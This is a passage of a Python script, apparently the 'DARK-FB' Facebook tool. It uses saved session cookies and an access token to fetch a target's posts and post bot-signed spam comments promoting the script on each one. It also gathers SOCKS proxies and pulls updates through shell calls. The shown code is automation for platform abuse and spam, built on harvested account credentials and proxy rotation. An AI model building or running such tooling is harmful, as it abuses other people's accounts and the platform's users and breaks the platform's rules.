						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
						"submit"  : "English (UK)"
						}
						url = 'https://mbasic.facebook.com' + x['action']
						exec = xyz.post(url,data=language,cookies=puput)
		except Exception as e:pass
	def get_posts(self,idq):
		kata=["Great Script Temperature GG","Cool Script bro🤘🤘🖕🖕","Cool Script Temperature😆😆😆😆👍👍👍","My role model script is never wrong🥰🥰😍😍😎😎"]
		with requests.Session() as xyz:
			try:
				with __Kiky__(max_workers=10) as (kiky_gtg):
					for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(idq,tiktok),cookies=puput).json()['data']:
						try:kiky_gtg.submit(self.get_postd(x['id']))
						except:pass
			except Exception as e:pass
	def get_postd(self,llp):
		kata=["Great script Temperature GG","Cool script bro 🤘🤘🖕🖕","Cool script temperature  😆😆😆😆👍👍👍","My role model script is never wrong🥰🥰😍😍😎😎"]
		with requests.Session() as xyz:
			komeno = ('%s\n\n%s%s'%(random.choice(kata),'https://www.facebook.com/'+llp,self.zona_waktu()))
			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(llp,komeno,tiktok),cookies=puput).text)
	def zona_waktu(self):
		_bulan_  = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][datetime.now().month - 1]
		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
		jam      = datetime.now().strftime("%X")
		tem      = ('\n\nThis Comment Was Created By A Bot\nAt  : %s WIB\nOn the Date : %s, %s\nThe script user : %s'%(jam,_hari_,hari_ini,self.visi_tor()))
		return(tem)
	def visi_tor(self):
		try:
			url_vis = "https://github.com/CyberDemon404/DARK-FB/blob//main/README.md"
			url_visi = "https://camo.githubusercontent.com/2d7842801a4429dade77642a7444a8d2d8bd83e92e9f9944aaeaa11343d250ae/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d44756d61692d39393126636f6c6f723d626c7565"
			ses_ = requests.Session()
			bhb = ""
			jhg = 1

			data_te = ses_.get(url_vis).text.strip()
			data_te = ses_.get(url_visi)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
			hasil_ = (str(le))
			return(hasil_)
		except:
			hasil_ = "-"
			return(hasil_)

class Main_:
	def __init__(self):
		msin=""
	def __check_update_(self, version_):
		try:
			version = requests.get("https://raw.githubusercontent.com/CyberDemon404/DARK-FB/main/data/version.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# OOPS... YOUR NETWORK IS DISCONNECTED",I,I)
			os.sys.exit()
		if version == version_:
			os.system('git pull')
			os.system('clear')
		else:
			os.system('git pull;clear')
			kocol = ""
			kocol += II+"Version of This Script("+II+version_+II+") Will be updated to ("+II+version+II+")\n\n"
			kocol += ("Wait a moment while updating the script.....\n")
			kocol += ("If its still stuck with updates, please use this command\n")
			kocol += ("python update.py\n")
			iprint(Panel(kocol, style=I))
			kotak("# TRY TO TYPE : python main.py ONCE AGAIN!!!",I,I)
			os.sys.exit()
	def __check_status_(self, mainx):
		try:
			mainz = requests.get("https://raw.githubusercontent.com/CyberDemon404/DARK-FB/main/data/status.txt").text.strip()
		except requests.exceptions.ConnectionError:
			kotak("# OOPS... YOUR NETWORK IS DISCONNECTED",I,I)
			os.sys.exit()
		if mainx == mainz:
			global yyy
			yyy = ""
		else:
			kotak("# SORRY SEVER DARK-FB IS MAINTENANCE, WE WILL BE BACK :D",I,I)
			os.system('git pull')
			os.sys.exit()
	def _no_vpn(self):
#		try:
		folder();open_role()
		self.__check_update_("2.2")
		self.__check_status_("Demon")
		get_proxy_socks4()
		get_proxy_socks5()
		Main()
#		except:console.print_exception(show_locals=None,word_wrap=None,max_frames=100,extra_line)

Main_()._no_vpn()
#Main_().__vpn__()
